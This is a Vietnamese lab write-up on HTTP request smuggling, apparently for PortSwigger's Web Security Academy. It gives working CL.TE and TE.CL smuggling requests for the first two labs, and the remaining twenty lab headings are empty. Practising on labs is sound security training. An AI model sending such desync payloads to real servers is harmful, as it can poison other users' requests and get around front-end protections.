# 1. HTTP request smuggling, basic CL.TE vulnerability
Để exploit HTTP request smuggling, ta cấu hình request sau:
```
POST / HTTP/1.1
Host: 0add002e0324d0fec01c8bee00ab0070.web-security-academy.net
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
Do back-end server xác định điểm cuối của request bằng header `Transfer-Encoding`, nên ký tự `G` cuối cùng sẽ được hiểu là một phần của request tiếp theo. Khi đó, nếu ta gửi thêm một request POST, thì thực tế method của request đó sẽ là GPOST.

Submit request trên hai lần, kết quả bài lab được giải.

# 2. HTTP request smuggling, basic TE.CL vulnerability
Bài lab có front-end sử dụng TE và backend sử dụng CL, như vậy ta có thể exploit với request sau:
```
POST / HTTP/1.1
Host: 0a76006c036dbdfec4dac96100a90022.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

5a
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x
0


```
Front-end sử dụng TE nên sẽ lấy body request từ `5a` đến hết ký tự kết thúc `0`, còn back-end sử dụng CL `Content-Length: 4` nên sẽ xử lý body request chỉ có phần `5a`. Như vậy, từ `GPOST` trở đi sẽ được coi là request kế tiếp. Khi ta submit request hai lần, request đầu tiên sẽ là POST request với body `5a`, và request thứ hai sẽ là GPOST request. Như vậy, bài lab được giải thành công.

# 3. HTTP request smuggling, obfuscating the TE header

# 4. HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

# 5. HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

# 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

# 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

# 8. Exploiting HTTP request smuggling to reveal front-end request rewriting

# 9. Exploiting HTTP request smuggling to capture other users' requests

# 10. Exploiting HTTP request smuggling to deliver reflected XSS

# 11. Response queue poisoning via H2.TE request smuggling

# 12. H2.CL request smuggling

# 13. HTTP/2 request smuggling via CRLF injection

# 14. HTTP/2 request splitting via CRLF injection

# 15. CL.0 request smuggling

# 16. Exploiting HTTP request smuggling to perform web cache poisoning

# 17. Exploiting HTTP request smuggling to perform web cache deception

# 18. Bypassing access controls via HTTP/2 request tunnelling

# 19. Web cache poisoning via HTTP/2 request tunnelling

# 20. Client-side desync

# 21. Browser cache poisoning via client-side desync

# 22. Server-side pause-based request smuggling
